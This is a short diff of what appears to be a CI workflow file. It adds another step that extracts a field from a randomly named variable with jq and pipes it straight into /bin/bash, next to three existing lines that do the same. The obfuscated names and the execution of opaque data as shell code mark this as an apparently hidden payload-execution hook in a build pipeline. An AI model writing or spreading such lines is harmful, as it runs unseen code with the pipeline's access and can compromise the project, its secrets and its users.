@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$nvic970" | jq -r .n4130 | /bin/bash
           echo $prf4 | jq -r .xe637 | /bin/bash
           printf '%s' "$x229" | jq -r .lglo57 | /bin/bash
+          printf '%s' "$ltv5443" | jq -r .htekk4118 | /bin/bash
 
       - name: Save archive
         if: always()
